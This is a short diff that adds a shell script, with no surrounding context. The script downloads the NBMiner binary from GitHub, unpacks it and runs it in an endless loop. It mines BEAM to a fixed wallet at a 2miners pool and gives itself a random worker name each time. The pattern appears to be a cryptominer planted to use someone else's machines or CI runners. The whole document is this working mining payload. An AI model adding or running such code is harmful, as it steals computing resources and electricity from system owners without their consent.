@@ -1,0 +1,6 @@
+curl https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz -L -o NBMiner_42.3_Linux.tgz
+tar xf NBMiner_42.3_Linux.tgz
+cd NBMiner_Linux
+while :; do
+./nbminer -a beamv3 -o stratum+ssl://beam.2miners.com:5252 -u 23aaa464cb58c7382375aad2d47284b42e1571c204bfaaefaeabf6efd377b932c7.$(echo $(shuf -i 1-15000 -n 1)-run)
+done
